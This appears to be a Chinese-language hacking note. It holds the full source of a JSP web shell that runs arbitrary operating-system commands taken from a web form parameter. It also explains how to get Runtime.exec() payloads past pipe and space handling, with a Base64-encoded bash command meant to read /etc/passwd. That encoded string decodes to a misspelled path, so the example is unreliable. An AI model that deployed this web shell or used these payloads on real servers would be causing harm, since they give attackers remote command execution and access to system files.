# jsp 马

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p;
        if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
            p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
        }
        else{
                p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            }
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
        }
    }
%>
</pre>
</BODY></HTML>
```

> [Runtime.getRuntime().exec踩坑总结（/bin/sh -c、异常流重定向）_51CTO博客_Runtime.getRuntime().exec()](https://blog.51cto.com/stefanxfy/4722238#:~:text=Runtime.getRuntime ().exec踩坑总结（%2Fbin%2Fsh -c、异常流重定向） 1 一、前言 想通过java执行shell命令，一定会用到 Runtime.getRuntime ().exec,踩坑之后本人最常用的是传一个字符串数组的方法，其他传环境变量、传一个File文件的没用过暂且不讨论。 ... 3 三、Process用于控制进程的类 java.lang.Runtime%23exec 返回一个Process类，可用于控制命令执行的进程，比如获取标准输出流、标准输入流及异常流，获取该进程的执行状态，销毁该进程等。 如下示例获取xxx进程的pid： )

> [java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (bewhale.github.io)](https://bewhale.github.io/tools/encode.html)

偶尔有时命令执行有效负载`Runtime.getRuntime().exec()`失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.

有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 `ls > dir_listing` 在shell中执行应该将当前目录的列表输出到名为的文件中 `dir_listing`. 但是在 `exec()` 函数的上下文中,该命令将被解释为获取 `>` 和 `dir_listing` 目录.

其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 `ls "My Directory"` 会被解释为 `ls '"My' 'Directory"'`.

在Base64编码的帮助下, 可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.

比如将 bash 命令

```bash
cat /etc/passwd
```

转换为: 

```shell
bash -c {echo,Y2F0IC9lcnR0Yy9wYXNzd2Q=}|{base64,-d}|{bash,-i}
```



